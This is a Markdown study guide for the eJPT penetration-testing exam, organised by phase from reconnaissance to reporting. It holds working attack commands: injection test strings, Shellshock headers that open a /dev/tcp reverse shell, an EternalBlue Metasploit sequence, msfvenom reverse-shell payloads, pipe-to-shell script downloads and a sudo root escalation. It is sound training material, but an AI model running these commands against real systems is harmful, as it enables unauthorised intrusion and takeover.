---
title: "eJPT Methodology - Complete Penetration Testing Framework"
topic: "eJPT Methodology"
exam_objective: "Complete framework covering all eJPT testing phases"
difficulty: "Medium"
tools:
  - "nmap"
  - "metasploit"
  - "burp suite"
  - "dirb"
  - "enum4linux"
related_labs:
  - "networking-fundamentals.md"
  - "linux-essentials.md"
  - "information-gathering-basics.md"
file_path: "01-theory-foundations/ejpt-methodology.md"
author: "Sarah Ashour"
version: "2.2"
last_updated: "2025-01-19"
last_reviewed: "2025-10-03"
license: "Educational Use Only"
maintainer_contact: "sarah@example.com"
tags:
  - "methodology"
  - "framework"
  - "pentesting"
  - "ejpt"
---

# eJPT Methodology — Complete Penetration Testing Framework

This guide shows a clear, practical process for penetration testing. It is written in simple English. It keeps the full content you need for studying and the eJPT practical exam. Commands stay the same; explanations are short and easy to read.

**Location:** `01-theory-foundations/ejpt-methodology.md`

---

## Table of Contents
- [What is the eJPT Methodology?](#what-is-the-ejpt-methodology)
- [The 5 Testing Phases](#the-5-testing-phases)
- [Phase 1 — Information Gathering](#phase-1---information-gathering)
- [Phase 2 — Assessment & Vulnerability Analysis](#phase-2---assessment--vulnerability-analysis)
- [Phase 3 — Exploitation](#phase-3---exploitation)
- [Phase 4 — Post-Exploitation](#phase-4---post-exploitation)
- [Phase 5 — Reporting & Documentation](#phase-5---reporting--documentation)
- [eJPT Exam Success Guide](#ejpt-exam-success-guide)
- [Complete Lab Example](#complete-lab-example)
- [Common Problems and Solutions](#common-problems-and-solutions)
- [Quick Reference](#quick-reference)
- [Cheat Sheet (One Page)](#cheat-sheet-one-page)
- [Evidence Naming Template](#evidence-naming-template)
- [Next Steps Checklist](#next-steps-checklist)
- [Changelog](#changelog)

---

## What is the eJPT Methodology?

The eJPT methodology is a simple 5-step process for penetration testing. The exam tests hands-on skills in a lab. This guide helps you work quickly and collect good evidence. Follow the steps in order to avoid missing important things.

---

## The 5 Testing Phases

| Phase | Name | What you do |
|-------|------|-------------|
| 1 | Information Gathering | Find live hosts, ports, and services |
| 2 | Assessment | Find and verify vulnerabilities |
| 3 | Exploitation | Get access and run shells |
| 4 | Post-Exploitation | Escalate privileges and collect data |
| 5 | Reporting | Save evidence and write the report |

### Tools setup (quick)
```
which nmap && echo "nmap: OK" || echo "nmap: MISSING"
which metasploit-framework && echo "msf: OK" || echo "msf: MISSING"
which dirb && echo "dirb: OK" || echo "dirb: MISSING"
which enum4linux && echo "enum4linux: OK" || echo "enum4linux: MISSING"

sudo updatedb
sudo msfdb init
```

---

## Phase 1 — Information Gathering

**Goals:** find live systems, open ports, and running services. Make a list of targets.

### Step 1 — Network discovery
Use ping scan or ARP scans to find live hosts.
```
nmap -sn 192.168.1.0/24
# If ping is blocked:
nmap -Pn 192.168.1.0/24
arp-scan -l
masscan -p1-1000 192.168.1.0/24 --rate=1000
```

### Step 2 — Port scanning
Find open ports and services.
```
nmap -F 10.10.10.5           # fast scan of common ports
nmap -p- 10.10.10.5         # scan all ports
nmap -sV -p 22,80,135,445 10.10.10.5  # service version detection
```

### Step 3 — Service enumeration
Gather more information about services.
```
whatweb http://10.10.10.5
dirb http://10.10.10.5 /usr/share/dirb/wordlists/common.txt
nikto -h http://10.10.10.5

enum4linux 10.10.10.5
smbclient -L \\10.10.10.5
nmap --script smb-enum* 10.10.10.5

nmap --script ssh-enum* 10.10.10.5
```

### Phase 1 Deliverables
Save these in a file or folder:
- List of live hosts and IPs
- Port scan outputs (nmap)
- Service details and versions
- Web directories found
- SMB shares and permissions

---

## Phase 2 — Assessment & Vulnerability Analysis

**Goals:** find weaknesses, check impact, and choose good targets to exploit.

### Automated scanning
Use scripts and scanners for quick checks.
```
nmap --script vuln 10.10.10.5
nmap --script=smb-vuln* 10.10.10.5
nmap --script=http-vuln* 10.10.10.5
nikto -h http://10.10.10.5
```

### Manual testing
Try simple manual tests to confirm issues.
```
curl "http://10.10.10.5/index.php?page=../../../etc/passwd"  # directory traversal test
curl "http://10.10.10.5/login.php?id=1' OR '1'='1"         # quick SQL test
curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"        # command injection test
```

### Exploit research
Look for public exploits or Metasploit modules.
```
searchsploit apache 2.4.41
searchsploit ms17-010

# Metasploit
msfconsole -q -x "search ms17-010"
```

### Risk table (example)
| Vulnerability | Score | Priority |
|---------------|-------|----------|
| EternalBlue | 9.3 | P1 |
| Shellshock | 10.0 | P1 |
| Directory Traversal | 7.5 | P2 |
| Weak SSH Keys | 5.3 | P3 |

Save your notes and pick which targets to exploit next.

---

## Phase 3 — Exploitation

**Goals:** gain access, get a shell, and keep it stable.

### Metasploit (common flow)
```
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.15
set LHOST 10.10.14.5
set payload windows/x64/meterpreter/reverse_tcp
exploit
# meterpreter > getuid
```

### Manual exploitation (examples)
Shellshock example:
```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/test.cgi
# reverse shell
nc -nlvp 4444 &
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://10.10.10.5/cgi-bin/test.cgi
```

### Improve your shell
Turn a basic shell into an interactive shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

### Create payloads and transfer files
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=5555 -f elf > shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=6666 -f exe > meter.exe

# Serve files from attacker machine
python3 -m http.server 8080
# On target: wget http://10.10.14.5:8080/shell
```

---

## Phase 4 — Post-Exploitation

**Goals:** get higher privileges, collect data, and move to other systems if useful.

### Linux privilege escalation
Check system info and find weak points.
```
uname -a
cat /etc/issue
ps aux
netstat -antup

find / -perm -4000 2>/dev/null      # SUID files
sudo -l                             # check sudo rights
# Automated script (optional)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

If sudo allows a program with no password, use it to get root:
```
# example when /usr/bin/python is allowed
sudo python -c 'import os; os.system("/bin/bash")'
```

### Windows privilege escalation and data collection
```
systeminfo
whoami /all
net user
net localgroup administrators

# Check services and saved files
sc query
dir C:/Users/Administrator/Documents
```

Use PowerUp or similar checks for quick hints:
```
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
```

### Lateral movement
From a compromised host, scan the internal network and check routes:
```
arp -a
netstat -rn
ip route show
nmap -sn 192.168.100.0/24
nmap -p 22,135,445,3389 192.168.100.1-50
```

Save all important files and screenshots.

---

## Phase 5 — Reporting & Documentation

**Goals:** collect evidence, write clear findings, and give fixes.

### Organize evidence
Make a clear folder structure and save outputs and screenshots.
```
mkdir -p ejpt_evidence/{recon,vulns,exploits,post_exploit}
mkdir -p ejpt_evidence/screenshots/{phase1,phase2,phase3,phase4}
history > ejpt_evidence/command_history.txt
echo "eJPT Assessment Summary - $(date)" > ejpt_evidence/summary.txt
```

### Report template (simple)
Include an executive summary, key findings, and recommendations.

````markdown
# Penetration Testing Report - Short Template

## Executive Summary
- Target: 10.10.10.0/24
- Timeframe: [dates]
- Critical issues found: X
- Systems fully compromised: Y

## Key Findings
1. Vulnerability name — affected host — short impact
2. Steps to reproduce
3. Evidence (screenshots / files)

## Recommendations
- Immediate steps to fix critical issues
- Short-term fixes (1 month)
- Long-term improvements (network segmentation, patch policy)
````

Be concise in the report and attach evidence files.

---

## eJPT Exam Success Guide

### Exam facts
- Duration: 72 hours
- Format: hands-on lab + multiple-choice questions
- Passing: ~70%
- You must show proof of work (screenshots, outputs, files)

### What to practice
- Fast host discovery and nmap scans
- Web directory finding (dirb/gobuster)
- SMB enumeration (enum4linux)
- Basic exploit usage (Metasploit and manual)

### Time plan for the 72 hours
- Day 1: discovery and assessment
- Day 2: exploitation and post-exploitation
- Day 3: finish evidence and answer questions

Keep simple log notes as you work.

---

## Complete Lab Example (short)

**Target network:** 10.10.10.0/24 — practice scenario.

1. Discover hosts:
```
nmap -sn 10.10.10.0/24
```

2. Scan a host:
```
nmap -sC -sV -p- 10.10.10.5
```

3. Web enumeration:
```
dirb http://10.10.10.5 /usr/share/wordlists/dirb/common.txt
```

4. SMB info:
```
enum4linux 10.10.10.15
```

5. If shellshock found, test and get shell:
```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/test.cgi
nc -nlvp 4444 &
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" http://10.10.10.5/cgi-bin/test.cgi
```

6. If EternalBlue found, use Metasploit as shown earlier.

---

## Common Problems and Solutions (quick)

- **Nmap shows no hosts:** try `-Pn` or ARP scan.
- **Exploit fails:** check if target is actually vulnerable, try different payloads, check architecture.
- **File uploads do not execute:** test different file types (php/asp/jsp) and paths.
- **Shell unstable:** upgrade shell with `python -c 'import pty; pty.spawn("/bin/bash")'` and use `export TERM=xterm`.

---

## Quick Reference

Useful commands grouped by phase:

```
# Phase 1
nmap -sn 192.168.1.0/24
nmap -sC -sV -p- target_ip

# Phase 2
nmap --script vuln target_ip
searchsploit service version

# Phase 3
msfconsole
msfvenom -p payload LHOST=ip LPORT=port -f format

# Phase 4
sudo -l
find / -perm -4000 2>/dev/null

# Phase 5
mkdir ejpt_evidence
history > commands.txt
```

---

## Cheat Sheet (One Page)
- Host discovery: `nmap -sn 10.10.10.0/24`
- Full scan: `nmap -sC -sV -p- target_ip`
- Web scan: `gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- SMB: `enum4linux target_ip`
- Vuln scan: `nmap --script vuln target_ip`
- Metasploit: `msfconsole; use <module>; set RHOSTS <ip>; exploit`
- Upgrade shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
- File transfer: `python3 -m http.server 8080` then `wget http://attacker/file`

---

## Evidence Naming Template
Use clear names for evidence files:
```
evidence/
  phase1_recon/
    10.10.10.5_nmap.txt
  phase2_vulns/
    10.10.10.5_vuln_scan.txt
  phase3_exploit/
    10.10.10.15_ms17-010_meterpreter.png
  phase4_postexploit/
    10.10.10.5_root_shell.png
  phase5_report/
    summary.txt
```

---

## Next Steps Checklist
- [ ] Read the cheat sheet
- [ ] Make evidence folders before exam
- [ ] Practice one full lab in 8 hours
- [ ] Convert this file to PDF for GoodNotes (optional)
- [ ] Review commands and notes daily until exam

---

## Changelog
- v2.2 (2025-10-03): Converted to simple English, added Cheat Sheet, Evidence Template, TOC, and Next Steps.
- v2.1 (2025-01-19): Initial full document.
